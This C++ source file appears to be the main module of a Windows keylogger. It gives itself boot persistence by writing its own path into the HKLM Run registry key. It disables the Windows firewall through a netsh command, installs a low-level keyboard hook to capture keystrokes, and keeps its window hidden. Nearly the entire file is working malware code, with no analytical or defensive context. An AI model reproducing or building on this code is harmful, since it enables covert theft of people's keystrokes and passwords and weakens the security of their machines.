#include "Keylogger/key_logging.h"
#include "Register/RegistryKey.h"

static std::string get_current_exe_path()
{
	char path[255];
	DWORD pathLen = GetModuleFileNameA(NULL, path, 255);
	std::string pth(path, path + pathLen);
	pth += '\0';
	return pth;
}

void autorun_through_registry()
{
	const char* valueName = "Keylogger";
	std::string exePath = get_current_exe_path();
	RegistryKey::create_if_not_exist(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

	try
	{
		std::string value = RegistryKey::query_string_value(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", valueName);
		if (value != exePath)
		{
			RegistryKey::set_string_value(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", valueName, exePath.data());
		}
	}
	catch (const std::runtime_error&)
	{
		// Value doesn't exist.
		RegistryKey::set_string_value(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", valueName, exePath.data());
	}
}

void firewall_control(bool firewallEnabled)
{
	const char* enableCmd = "netsh firewall set opmode enable";
	const char* disableCmd = "netsh firewall set opmode disable";
	system(firewallEnabled ? enableCmd : disableCmd);
}

int initialize()
{
	// Enable autorun.
	autorun_through_registry();
	// Disable firewall.
	firewall_control(false);

	// Create keylogger
	KeyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,		   // low-level keyboard input events
		keyboard_hook_callback,		   // pointer to the hook procedure
		GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure
		NULL				   //desktop apps, if this parameter is zero
	);
	if (!KeyboardHook)
	{
		// Hook returned NULL and failed
		std::cout << "[!] Failed to get handle from SetWindowsHookEx()" << std::endl;
	}
	else
	{
		std::cout << "[*] KeyCapture handle ready" << std::endl;
		MSG Msg;
		while (GetMessage(&Msg, NULL, 0, 0) > 0)
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}
	unhook_keyboard();
	return 0;
}

// Hide window, but the windows flashes..
int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR    lpCmdLine,
	int       cmdShow)
{
	initialize();
}